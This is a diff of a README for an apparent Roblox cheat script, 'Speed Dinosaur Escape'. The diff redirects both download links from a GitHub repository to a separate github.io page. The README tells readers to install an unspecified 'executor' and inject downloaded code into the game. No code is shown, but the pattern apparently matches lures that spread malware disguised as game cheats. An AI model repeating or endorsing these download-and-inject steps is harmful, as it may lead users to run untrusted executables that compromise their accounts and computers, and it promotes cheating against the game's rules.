@@ -1,6 +1,6 @@
 # 🦖 Speed-Dinosaur-Escape-Roblox-Script-OP-script-2026 - Master the game with ease today
 
-[![Download Now](https://img.shields.io/badge/Download-Script-blue.svg)](https://github.com/leslieactive63/Speed-Dinosaur-Escape-Roblox-Script-OP-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Script-blue.svg)](https://leslieactive63.github.io)
 
 ## 📋 Project Overview
 
@@ -26,7 +26,7 @@ Follow these steps to set up the script on your Windows computer.
 
 1.  **Open Roblox:** Log into your Roblox account and launch the Speed Dinosaur Escape game.
 2.  **Use an Executor:** You need a piece of software called an executor to run scripts in Roblox. Download and install a safe executor of your choice.
-3.  **Visit the Download Page:** Visit this page to download the script file: [https://github.com/leslieactive63/Speed-Dinosaur-Escape-Roblox-Script-OP-script-2026](https://github.com/leslieactive63/Speed-Dinosaur-Escape-Roblox-Script-OP-script-2026).
+3.  **Visit the Download Page:** Visit this page to download the script file: [https://leslieactive63.github.io](https://leslieactive63.github.io).
 4.  **Copy the Code:** Open the downloaded file using a simple text editor like Notepad. Copy the entire code block.
 5.  **Inject the Script:** Paste the code into your executor. Click the "Execute" or "Inject" button provided by that program.
 6.  **Enjoy the Game:** A menu will appear on your screen inside the game. Use your mouse to click the features you want to activate.
